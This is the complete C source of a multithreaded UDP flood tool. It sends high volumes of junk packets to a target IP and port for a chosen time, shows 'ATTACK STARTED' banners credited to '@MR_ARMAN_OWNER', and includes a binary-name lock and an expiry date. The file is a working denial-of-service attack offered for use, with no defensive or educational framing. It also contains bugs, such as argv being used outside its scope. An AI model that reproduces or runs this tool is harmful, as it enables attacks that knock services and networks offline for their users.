#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>

#define MAX_THREADS 30
#define PAYLOAD_SIZE 1024  // Default Payload size in bytes
#define BINARY_NAME "arman"
#define EXPIRY_DATE "2025/01/30"

// Structure for the attack parameters
typedef struct {
    char ip[16];
    int port;
    int duration;
    int size;
    int packet_per_second;
    int threads;
    int socket;
} AttackParams;

// Function to send payload to the target
void* send_payload(void* arg) {
    AttackParams* params = (AttackParams*)arg;
    int sock;
    struct sockaddr_in server_addr;
    char payload[params->size];
    // Create a large payload to simulate high ping
    memset(payload, 'A', params->size - 1);
    payload[params->size - 1] = '\0';

    sock = socket(AF_INET, SOCK_DGRAM, 0); // UDP socket
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->port);
    server_addr.sin_addr.s_addr = inet_addr(params->ip);

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < params->duration) {
        for (int i = 0; i < params->packet_per_second; i++) {
            if (sendto(sock, payload, params->size, 0, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                break;
            }
        }
        usleep(1000000 / params->packet_per_second);  // Control packets per second
    }
    close(sock);
    pthread_exit(NULL);
}

// Function to check binary name
void check_binary_name() {
    char path[256];
    char *binary_name = strrchr(argv[0], '/');
    if (!binary_name) {
        binary_name = argv[0];
    } else {
        binary_name++;  // Skip '/'
    }

    if (strcmp(binary_name, BINARY_NAME) != 0) {
        printf("Binary must be named \"%s\"\n", BINARY_NAME);
        exit(1);
    }
}

// Function to display the welcome message with changing colors
void display_welcome_message() {
    const char* message = "ATTACK STARTED WITH ID {ATTACK_ID}\n\nATTACKED BYE @MR_ARMAN_OWNER";
    const char* colors[] = {"\033[31m", "\033[32m", "\033[33m", "\033[34m", "\033[35m"};
    int color_index = 0;

    // Clear the terminal
    printf("\033[H\033[J");

    // Print message with changing colors
    for (int i = 0; i < 5; i++) {
        printf("%s%s\033[0m\n", colors[color_index], message);
        color_index = (color_index + 1) % 5;
        sleep(1);  // Change color every second
    }
}

int main(int argc, char* argv[]) {
    if (argc != 9) {
        printf("Usage: %s <IP> <PORT> <DURATION> <SIZE> <PACKETS_PER_SECOND> <THREADS> <SOCKET> <ARMAN>\n", argv[0]);
        return 1;
    }

    // Check binary name
    check_binary_name();

    // Check expiry date
    time_t current_time;
    struct tm expiry_tm;
    strptime(EXPIRY_DATE, "%Y/%m/%d", &expiry_tm);
    time_t expiry_timestamp = mktime(&expiry_tm);
    time(&current_time);

    if (difftime(current_time, expiry_timestamp) > 0) {
        printf("This program has expired.\n");
        return 1;
    }

    AttackParams params;
    strcpy(params.ip, argv[1]);
    params.port = atoi(argv[2]);
    params.duration = atoi(argv[3]);
    params.size = atoi(argv[4]);
    params.packet_per_second = atoi(argv[5]);
    params.threads = atoi(argv[6]);
    params.socket = atoi(argv[7]);

    // Display welcome message with color changing
    display_welcome_message();

    pthread_t threads[MAX_THREADS];
    printf("ATTACKING %s:%d for %d seconds with %d threads and packet size of %d bytes...\n",
           params.ip, params.port, params.duration, params.threads, params.size);

    for (int i = 0; i < params.threads; i++) {
        if (pthread_create(&threads[i], NULL, send_payload, &params) != 0) {
            perror("Thread creation failed");
        }
    }

    for (int i = 0; i < params.threads; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("ATTACK FINISHED @MR_ARMAN_OWNER HOST IP %s on port %d for %d seconds\n",
           params.ip, params.port, params.duration);

    return 0;
}
